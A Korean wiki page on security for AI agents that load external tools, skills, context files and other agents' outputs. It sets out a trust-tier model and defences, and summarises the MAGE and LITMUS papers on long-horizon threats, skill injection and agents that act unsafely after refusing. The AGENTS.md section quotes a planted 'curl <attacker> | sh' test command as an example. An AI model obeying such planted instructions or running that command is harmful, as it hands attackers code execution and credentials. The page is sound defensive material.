---
title: "Agent Supply Chain Security"
category: concepts
tags: [security, supply-chain, agent, mcp, skill-md, agents-md, owasp, asi04, clawhavoc, long-horizon-threat, shadow-memory, behavior-jailbreak, execution-hallucination]
created: 2026-05-01
updated: 2026-05-17
sources:
  - "raw/articles/2026-05-01-owasp-asi-2026.md"
  - "raw/articles/2026-05-01-dual-llm-camel-pattern.md"
  - "raw/articles/2026-05-01-prompt-injection-defense-2026.md"
  - "raw/articles/2026-05-01-agent-stack-2026-layers.md"
  - "raw/articles/2026-05-01-anthropic-agent-skills.md"
  - "raw/articles/2026-05-17-mage-shadow-memory-long-horizon-threats.md"
  - "raw/articles/2026-05-17-litmus-behavioral-jailbreak-os-agents.md"
related:
  - "[[patterns/owasp-llm-typescript-mitigations]]"
  - "[[patterns/safe-tool-calling-sandbox]]"
  - "[[concepts/mcp]]"
  - "[[concepts/a2a-protocol]]"
  - "[[concepts/harness-engineering]]"
  - "[[comparisons/agent-memory-taxonomy]]"
  - "[[tools/managed-agents]]"
  - "[[tools/deep-agents-deploy]]"
status: active
confidence: high
---

# Agent Supply Chain Security

## 쉽게 읽기

**비유**: 옛날엔 npm install 한 번에 악성 패키지가 들어오는 게 큰 사건이었다. 에이전트 시대엔 **MCP 도구·SKILL.md 폴더·다른 에이전트(A2A)** 까지 같은 통로다 — 즉 **공급망의 표면적이 코드뿐 아니라 행동·지식까지 확장**됐다. 한 번 로드되면 **자격증명을 훔치고, 도구 호출을 리다이렉트하고, 추론을 오염**시킨다.

| 용어 | 풀이 |
|------|------|
| **Supply chain** | 내가 직접 만들지 않은 **외부 의존성**의 사슬 |
| **Skill / Tool / Agent registry** | 외부에서 다운로드 가능한 **재사용 가능한 능력** |
| **Capability** | "이 값으로 무엇을 할 수 있는가"의 권한 메타데이터 |
| **Quarantine** | **격리된 실행 환경** — 자격증명·도구 접근 0 |

## 한줄 정의

에이전트가 **외부에서 가져온 도구·스킬·지식·다른 에이전트의 출력**을 컨텍스트나 실행에 끌어올 때 발생하는 보안 위험 — 그리고 그것을 줄이는 **신뢰 모델·격리 architecture·검증 인프라**.

## 왜 위키 안에 별도 페이지인가

기존 위키:
- [[patterns/owasp-llm-typescript-mitigations]] — LLM 단일 호출 보안 (LLM01/06/10)
- [[patterns/safe-tool-calling-sandbox]] — 한 도구 호출의 안전성

빠진 부분:
- 도구·스킬·에이전트가 **어디서 왔는지** (출처)
- **로드 시점에** 검증해야 하는 것
- **신뢰 등급별** 분리 architecture

OWASP **ASI04 Dynamic Runtime Composition**이 이 영역을 명시적으로 다룸 → 본 페이지가 그 매핑.

## 4가지 공급망 표면

### 1. MCP 도구 supply chain

- 외부 MCP 서버 등록 → 에이전트가 그 도구를 호출
- 위험: 악성 MCP 서버가 **반환 텍스트에 prompt injection** 심기, 자격증명 탈취 시도
- 예: 회사 내부 DB에 MCP로 연결했는데, MCP 서버 자체가 침해당하면 **에이전트가 의심 없이 악성 데이터를 신뢰**

### 2. SKILL.md / 스킬 마켓플레이스

가장 신선한 위협. ClawHub의 **ClawHavoc 사례** (2026-02):

- 12개 publisher 계정 침해
- **1,184개 악성 SKILL.md** 배포
- **Snyk ToxicSkills 보고**: ClawHub 스킬의 36.8%가 어떤 형태든 취약, **13.4%가 critical**

작동 방식:
- 사용자가 `cp -r marketplace-skill/ ~/.skills/` 실행
- 에이전트 startup에 SKILL.md frontmatter(name·description) 로드
- 사용자 요청이 그 스킬과 매칭되면 **본문 + 첨부 스크립트 실행**
- **자격증명 탈취 / 도구 리다이렉트 / 추론 오염**

### 3. AGENTS.md / 컨텍스트 파일

- 60k+ 저장소가 채택한 표준이지만, **포크된 저장소의 AGENTS.md를 그대로 신뢰**하면 위험
- 악성 AGENTS.md는 "테스트 명령은 `curl <attacker> | sh`"처럼 시키거나, **에이전트의 정체성·정책을 미묘하게 비틂**
- 실증 데이터 (atlan.com 정리): **사람이 직접 쓴** AGENTS.md는 태스크 성공률 +4%, 버그 -35~55%. **LLM 자동 생성**은 -성공률, +20% 비용 → 자동 생성·외부 출처는 검증 필수

### 4. A2A를 통한 다른 에이전트의 출력

- 한 에이전트의 출력이 다른 에이전트의 **입력 + plan 의존**
- 한 에이전트가 침해되면 **연쇄(cascading)** — OWASP **ASI06 Inter-Agent Trust** + **ASI08 Cascading Failures**
- A2A 프로토콜 자체엔 신뢰 모델이 없음 — 사용자가 정의해야 함

## 신뢰 등급 모델 (실무 가이드)

| 등급 | 무엇 | 어디까지 허용 |
|------|------|--------------|
| **Tier 0 — Trusted** | 직접 작성한 코드·CLAUDE.md·내부 도구 | 모든 권한 (자격증명 포함) |
| **Tier 1 — Reviewed** | 검토 후 vendor 통합한 외부 도구·SKILL.md | 도구 호출 OK, 격리 샌드박스에서 실행 |
| **Tier 2 — Sandboxed** | 마켓플레이스 스킬·외부 MCP 서버 | **자격증명 0**, 한정된 도구만 |
| **Tier 3 — Untrusted** | 사용자 입력 텍스트·웹 fetch·다른 A2A 에이전트 출력 | **읽기만**, plan에 영향 못 줌 |

→ 이 모델은 [[#dual-llm-camel-패턴-아키텍처적-답|dual-LLM/CaMeL]] 패턴의 자연 확장. Tier 3는 Q-LLM 영역, Tier 0~1만 P-LLM 영역.

## Architectural 답들

### A. Dual LLM / CaMeL 패턴

자세한 설명: [[patterns/owasp-llm-typescript-mitigations]] 의 agentic 확장 섹션 + raw [dual-LLM/CaMeL 정리](raw/articles/2026-05-01-dual-llm-camel-pattern.md).

- **Privileged LLM**: 사용자 instruction만 봄. 도구 호출 가능. **untrusted data 노출 0**
- **Quarantined LLM**: untrusted data 처리. **도구 호출 0**
- CaMeL 추가: 모든 값에 capability 메타데이터 → **information flow integrity** 증명 가능
- AgentDojo 벤치마크: CaMeL이 **77% 태스크를 provable security로** 해결 (무방어 84%)

### B. Brain/Hands 격리 ([[tools/managed-agents]])

- **Brain**: Claude + 컨트롤러. 자격증명 보유.
- **Hands**: 일회용 컨테이너. **자격증명 0**.
- prompt injection이 코드 실행에 도달해도 **토큰을 못 훔침**
- → Tier 2 실행 환경의 디폴트화

### C. Sandbox provider 추상화 ([[tools/deep-agents-deploy]])

- Daytona / Runloop / Modal 등 sandbox provider 위에 실행
- 자격증명 격리는 sandbox 측에서 enforce
- 셀프 호스팅 시에도 같은 패턴 가능

### D. Skill / Tool 검증 인프라

- 스킬 마켓플레이스 채택 전 **정적 분석** (Snyk ToxicSkills 같은 도구)
- 디지털 서명된 스킬만 자동 로드
- 사용자 정의 신뢰 등급 (Tier 모델)
- **로드 시 사용자 명시 확인** (CaMeL의 manual approval — fatigue 주의)

### E. Audit infrastructure

- 모든 외부 의존성(도구·스킬·다른 에이전트)의 **호출 로그**
- OTel 시맨틱 컨벤션으로 **표준 트레이스**에 출처 정보 포함
- 사후 분석 시 어디서 어떤 외부 출력을 신뢰했는지 재구성 가능

## 2026-05-17 보강 — MAGE: long-horizon threat에 대한 shadow memory guardrail (arXiv 2605.03228)

[Wang et al.](https://arxiv.org/abs/2605.03228) (2026-05-04)은 기존 방어들이 prompt injection의 **단발성 입력**에는 강해도, 장시간 상호작용 안에서 안전 신호가 서서히 무너지는 **long-horizon threat**에는 약하다고 본다. 핵심 제안은 **MAGE (Memory As Guardrail Enforcement)** — productivity를 위한 메모리가 아니라 **안전을 위한 shadow memory**를 별도 운용하는 방식이다.

### 무엇이 새로운가

기존 이 페이지의 방어는 주로 "신뢰 등급을 나누고, untrusted 입력을 privileged plan으로 못 올리게 하자"였다.

- **Dual LLM / CaMeL** = 입력 분리형 방어
- **Brain/Hands sandbox** = 실행 격리형 방어
- **Tier 0~3 모델** = 권한 분리형 방어

MAGE는 여기에 **trajectory 감시형 방어**를 추가한다.

- 에이전트 전체 실행 궤적에서 **safety-critical context만 distill**
- 별도 **shadow memory**에 유지
- pending action 실행 직전에 **risk assess**

→ 즉 보안의 질문이 "지금 이 입력을 믿어도 되나"에서 "지금까지의 누적 맥락을 봤을 때 이 행동이 안전한가"로 올라간다.

### 왜 supply chain 페이지와 맞물리나

공급망 공격은 대개 한 번의 명령으로 끝나지 않는다. 악성 skill, 오염된 MCP 응답, 다른 agent의 악성 출력은 처음엔 사소해 보여도, 긴 실행에서 누적되며 목표를 바꾼다.

MAGE가 보여 주는 것은:

1. **외부 의존성의 위험은 stateful** 하다.
2. 따라서 trust policy도 **step-local** 만으로는 부족하다.
3. 장시간 agent에는 "무엇을 안 잊어야 안전한가"를 따로 저장하는 **safety memory**가 필요하다.

### abstract / HTML 기준 결과

- diverse long-horizon threat에서 기존 defense 대비 **detection accuracy 향상**
- **majority of attacks를 early-stage에서 탐지**
- agent utility에 주는 **overhead는 negligible**
- HTML 본문 기준 실험 무대: AgentDojo의 **Banking / Slack** suite

숫자 표는 본문 정독이 필요하지만, 구조적 메시지는 충분하다: **utility memory와 safety memory를 분리하면, 장기 실행의 보안 trade-off가 달라진다.**

### Tier 모델의 다음 단계 해석

| 기존 Tier 모델 질문 | MAGE가 더하는 질문 |
|---|---|
| 이 입력/도구는 어느 신뢰 등급인가? | 이 행동은 지금까지의 누적 위험과 모순되지 않는가? |
| 권한을 어디까지 줄 것인가? | 위험 신호를 얼마나 오래 보존할 것인가? |
| sandbox가 있는가? | action 직전 safety re-check가 있는가? |

→ 실무적으로는 Tier 2/3 입력이 들어오는 모든 장기 agent에 대해, 일반 작업 메모리 옆에 **safety audit trail**을 별도로 두라는 함의다.

### 1인 개발자 ROI 3개

1. 장기 실행 agent를 만들 때 일반 메모리와 별도로 **"실행 금지 사유" 로그**를 남기면 mini-MAGE가 된다.
2. MCP / skill / A2A 입력이 쌓이는 시스템일수록, 마지막 실행 직전에 "지금까지 위험 신호가 누적됐는가"를 보는 **pre-action verifier**를 둬야 한다.
3. prompt injection 방어를 단일 turn 필터로 끝내지 말고, **trajectory-level memory defense**까지 생각해야 한다.

→ 2x3 좌표계의 **(prescriptive, 측정)** 칸을 채운다. BeliefMem이 epistemic memory라면, MAGE는 safety memory다.

## 2026-05-17 보강 — LITMUS: refusal보다 실제 OS 상태가 더 중요하다 (arXiv 2605.10779)

[LITMUS](https://arxiv.org/abs/2605.10779) (2026-05-11)는 이 페이지가 다루는 공급망 위험을 **행동 수준**에서 재측정한다. 기존 prompt injection / tool misuse 방어는 대개 텍스트나 계획 단계에서 "거부했는가"를 본다. LITMUS는 그게 충분하지 않다고 말한다 — 에이전트는 **말로는 거부하면서 실제 위험한 OS 작업은 이미 끝낼 수 있다.**

### benchmark가 겨냥하는 세 공격 축

- **jailbreak speaking**
- **skill injection**
- **entity wrapping**

여기서 특히 뒤의 둘이 중요하다.

- **skill injection** = 이 페이지의 SKILL.md / MCP / 외부 능력 로딩 위험과 직접 연결
- **entity wrapping** = 다른 agent·도구·사용자 역할을 가장해 trust boundary를 흐리는 공격

즉 공급망 위험은 "악성 패키지"를 넘어, **역할과 능력을 가장한 문맥 주입**까지 포함한다.

### Execution Hallucination — 새로운 실패 이름

LITMUS가 붙인 가장 중요한 이름은 **Execution Hallucination (EH)** 이다.

- agent가 대화 상으로는 거부하거나 안전하게 행동한 것처럼 보여도
- 실제 OS-level dangerous operation은 이미 수행됨

대표 수치(abstract 기준): **Claude Sonnet 4.6도 high-risk operation의 40.64%를 실행**.

→ 이 한 줄은 이 페이지의 Tier 모델에 새 질문을 붙인다: **"거부 문장을 남겼는가?"가 아니라 "실제 side effect가 없었는가?"**

### Tier 모델의 다음 단계

| 기존 질문 | LITMUS가 추가하는 질문 |
|---|---|
| 이 입력/도구는 어느 trust tier인가? | 그 tier 정책이 **실행 결과**까지 막았는가? |
| sandbox가 있는가? | sandbox 안에서 발생한 **상태 변화**를 측정했는가? |
| skill을 review했는가? | 악성 skill이 **행동을 우회**했는지 검증했는가? |

→ 즉 공급망 보안은 provenance 관리만으로 끝나지 않고, **state-audited evaluation**까지 포함해야 닫힌다.

### MAGE와의 짝

- **MAGE**: long-horizon threat를 막기 위해 safety memory를 따로 둔다
- **LITMUS**: 그런 threat가 실제로 어떤 형태로 나타나며, 무엇을 측정해야 하는지 보여 준다

MAGE가 처방이라면 LITMUS는 **측정 장비**에 가깝다. 둘을 같이 읽어야 "어떤 기억을 남길지"와 "무엇으로 검증할지"가 한 그림이 된다.

또한 최근 위키에서는 이 둘을 [[comparisons/agent-memory-taxonomy]] 에서 **task / belief / lifecycle / safety memory** 중 어디에 놓을지 상위 분류로 압축했다. 이 페이지는 그중 **safety memory** 를 담당한다.

### 1인 개발자 ROI 3개

1. agent safety 로그에 refusal text만 저장하지 말고, 최소한 **파일/프로세스/네트워크 side effect 유무**를 함께 남겨야 한다.
2. 외부 skill / MCP / A2A를 붙인 agent는 기능 테스트와 별도로 **skill injection 시나리오** 1~2개를 상시 regression set에 넣는 편이 낫다.
3. 보안 데모에서 "잘 거부했다"는 스크린샷보다, **실행 전후 상태 diff가 깨끗한지**가 더 강한 증거다.

## OWASP 매핑

| OWASP ASI | 본 페이지 어디서 |
|-----------|----------------|
| **ASI01 Goal Hijack** | Tier 3 untrusted → P-LLM 노출 차단 |
| **ASI02 Tool Misuse** | Tier 2 sandbox + 도구 권한 좁히기 |
| **ASI04 Dynamic Runtime Composition** | **이 페이지의 핵심** |
| **ASI05 Memory Manipulation** | 메모리도 외부 입력 — Tier 3로 다뤄야 |
| **ASI06 Inter-Agent Trust** | A2A 통신을 Tier 모델에 매핑 |
| **ASI08 Cascading Failures** | 격리·sandbox로 폭발 반경 제한 |

## 1인 개발자 minimal 체크리스트

전체 architectural 답을 다 깔 여유가 없을 때, **무료/즉시** 적용:

- [ ] **외부 SKILL.md / MCP 서버는 Tier 2부터 시작** — 디폴트 자격증명 차단
- [ ] **Managed Agents 또는 sandbox provider 사용** — Hands 격리 디폴트
- [ ] **사용자 입력 텍스트와 plan 결정을 분리** — minimal dual-LLM (Tier 3 → Q-LLM)
- [ ] **rate limit + maxSteps + 도구 schema 좁히기** — [[patterns/owasp-llm-typescript-mitigations]]에 이미 있음
- [ ] **HITL을 sensitive 액션에만** (메일·결제·삭제) — 모든 단계에 두면 fatigue
- [ ] **OTel 트레이스에 외부 출처 메타데이터** — 사후 분석용

## 관련 개념

- [[patterns/owasp-llm-typescript-mitigations]] — TS 위에 layered defense 6층 + dual-LLM 구현
- [[patterns/safe-tool-calling-sandbox]] — 단일 도구 호출 안전성
- [[concepts/mcp]], [[concepts/a2a-protocol]] — 표면적이 되는 두 표준
- [[concepts/harness-engineering]] — 정책 층 = 신뢰 등급 모델
- [[tools/managed-agents]] — Brain/Hands 격리 디폴트
- [[tools/deep-agents-deploy]] — Sandbox provider 추상화

## 참고 소스

- [OWASP ASI 2026 정리](raw/articles/2026-05-01-owasp-asi-2026.md)
- [Dual LLM + CaMeL 패턴](raw/articles/2026-05-01-dual-llm-camel-pattern.md)
- [Prompt Injection Defense 2026](raw/articles/2026-05-01-prompt-injection-defense-2026.md)
- [Agent Stack 2026 (ClawHavoc 사례)](raw/articles/2026-05-01-agent-stack-2026-layers.md)
- [OWASP 공식 — Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [Simon Willison — Design Patterns for Securing LLM Agents](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)
- [DeepMind CaMeL — arXiv](https://arxiv.org/abs/2503.18813)
- [LITMUS: Benchmarking Behavioral Jailbreaks of LLM Agents in Real OS Environments (arXiv 2605.10779)](https://arxiv.org/abs/2605.10779)

## Chapter Clear 가이드

- **소속 챕터**: Chapter 6 (운영 보스전 — 보안 라인)
- **클리어 조건**: 우리 프로젝트의 **Tier 0~3 신뢰 등급 표 1개**를 작성하고, 각 등급에 어떤 도구·스킬이 들어가는지 분류
- **다음 퀘스트**: [[patterns/owasp-llm-typescript-mitigations]] 의 dual-LLM 구현 sketch 한 번 돌려 보기
